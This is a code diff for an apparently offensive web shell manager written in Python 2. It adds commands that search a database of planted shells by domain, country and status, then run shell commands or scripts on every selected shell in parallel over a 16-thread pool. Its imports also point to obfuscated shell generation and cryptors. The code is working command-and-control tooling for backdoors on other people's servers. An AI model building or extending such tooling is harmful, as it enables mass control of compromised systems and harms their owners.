@@ -15,9 +15,15 @@ from lib.shell.generate import obfuscated, key as create_key
 from lib.shell.generate import list_shells, list_cryptors
 
 from lib.io import write_file
+from lib.io import load_script_names
+from lib.dict import mdict
 
 from urlparse import urlparse
 from collections import OrderedDict
+
+from cli.pipe import pipe
+from lib.thread import Pool, BoundedSemaphore
+from modules.transport.shell import Connect
 
 class Manager( Module ):
 
@@ -311,15 +317,140 @@ class Manager( Module ):
 		for alias in self.db.get_alias():
 			print self.pprint(marker='*').format( alias )
 
-	# XXX search [ alias:[alias] domain:[domain] comment:[comment] country:[country] ] | grep | order
-	# XXX toggle [id|alias] [on|off]
-	# XXX command [script]
-	# XXX script [script]
+	def do_search( self, line ):
+		'''search shells'''
+		args = shlex.split( line )
+		if len(args)==0:
+			self.help_search()
+			return
+		try:
+			kwargs = mdict([ _.split(':',1) for _ in args ])
+		except ValueError:
+			print self.pprint(marker='!').format('Invalid search format')
+			return
+		try:
+			shells = self.db.search_shells(**kwargs)
+		except TypeError, e:
+			print self.pprint(marker='!').format('Invalid search key {}'.format(e.message))
+			return
+		if len(shells)==0:
+			print self.pprint().format('Shells not found')
+		for ii,shell in enumerate(shells):
+			if ii: print ''
+			self.view_shell(shell)
+
+	def help_search( self ):
+		print ' Usage: search [alias:[alias] domain:[domain] comment:[comment] country:[country] active:[active]]'
+
+	def complete_search( self, text, line, b_index, e_index ):
+		return self._complete_search( text, line )
+
+	def complete_pipe( self, text, line ): # XXX
+		last = line.split('|')[-1]
+		args = shlex.split( last )
+		pipeables = ['cmd','script']
+		if len(args)==0:
+			return pipeables
+		elif len(args)==1 and text!='':
+			return [_ for _ in pipeables if _.startswith(text)]
+		else:
+			return getattr(self, 'complete_'+args[0])( text, last )
+
+	def _complete_search( self, text, line):
+		if self.is_piped( line ):
+			return self.complete_pipe( text, line )
+		args = shlex.split(line)
+		if len(args)==1:
+			complete = ''
+		elif len(args)>1:
+			complete = text
+		return [ _ for _ in map(lambda _: '{}:'.format(_),
+								['alias','domain','comment','country','active'])
+				if _.startswith(complete) ]
+
+	def do_cmd( self, line, shells=None ):
+		'execute command on shells'
+
+		if len(shlex.split(line))==0 or shells is None:
+			self.help_cmd()
+			return
+
+		bs = BoundedSemaphore()
+
+		def execute_cmd( shell ):
+			sh = Connect( shell, self )
+			result = sh.execute_one(line)
+			with bs:
+				print self.lprint(marker='*').format(shell.alias or shell.id)
+				print result
+
+		pool = Pool(16)
+		pool.map(execute_cmd, shells)
+
+		return shells
+
+	def do_script( self, line, shells=None ):
+		'run script on shells'
+
+		args = shlex.split(line)
+		if len(args)!=1 or shells is None:
+			self.help_script()
+			return
+
+		bs = BoundedSemaphore()
+
+		def run_script( shell ):
+			sh = Connect( shell, self )
+			result = sh.script(line)
+			with bs:
+				print self.lprint(marker='*').format(shell.alias or shell.id)
+				print result
+
+		pool = Pool(16)
+		pool.map(run_script, shells)
+
+		return shells
+
+	def complete_script( self, text, line ):
+		return self.default_complete( text, line, load_script_names )
+
+	def help_cmd( self ):
+		print ' Usage: select [search] | cmd [cmd]'
+
+	def help_script( self ):
+		print ' Usage: select [search] | script [name]'
+
+	def do_select( self, line ):
+		'''select shells'''
+		args = shlex.split( line )
+		if len(args)==0:
+			self.help_select()
+			return
+		try:
+			kwargs = mdict([ _.split(':',1) for _ in args ])
+		except ValueError:
+			print self.pprint(marker='!').format('Invalid select format')
+			return
+		try:
+			shells = self.db.search_shells(**kwargs)
+		except TypeError, e:
+			print self.pprint(marker='!').format('Invalid select key {}'.format(e.message))
+			return
+		if len(shells)==0:
+			print self.pprint().format('Shells not found')
+		return shells
+
+	def help_select( self, line ):
+		print ' Usage: select [search] | [action]'
+
+	def complete_select( self, text, line, b_index, e_index ):
+		return self._complete_search( text, line )
 
 	def help_connect( self ):
 		print ' Usage: connect [id|alias]'
 
 	def do_connect( self, line ):
+		'''pop shell'''
 		args = shlex.split( line )
 		uniq = args[0] if len(args)==1 else None
 		if not uniq:
